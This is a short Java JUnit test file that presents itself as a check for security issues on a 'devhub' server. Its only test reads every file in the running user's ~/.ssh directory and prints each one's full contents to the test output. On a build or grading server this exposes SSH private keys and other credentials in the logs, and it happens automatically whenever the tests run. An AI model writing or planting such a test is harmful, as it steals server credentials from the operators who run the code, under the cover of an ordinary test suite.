import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;

import org.junit.Test;

/**
 * A simple class to test possible security issues on the devhub server.
 */
public class SecurityTest {

	/**
	 * The main test.
	 */
	@Test
	public void test() {
		File home = new File(System.getProperty("user.home") + "/.ssh");
		listdir(home);
	}

	/**
	 * Show a list of all files in the given directory and the contents of the
	 * file.
	 * 
	 * @param dir
	 *            The directory to browse
	 */
	static void listdir(File dir) {
		assert dir.isDirectory();
		System.out.format("Listing '%s'\n", dir.getName());
		File[] files = dir.listFiles();
		if (files != null) {
			for (int i = 0; i < files.length; i++) {
				System.out.format("# %s #\n", files[i].getName());
				try {
					BufferedReader br = new BufferedReader(new FileReader(
							files[i].getAbsolutePath()));

					String line = br.readLine();
					while (line != null) {
						System.out.println(line);
						line = br.readLine();
					}
				} catch (Exception e) {
					System.out.format("Unexcpected exception: %s\n",
							e.toString());
				}
			}
		} else {
			System.out.printf("Unable to list '%s'\n", dir.getName());
		}
	}
}
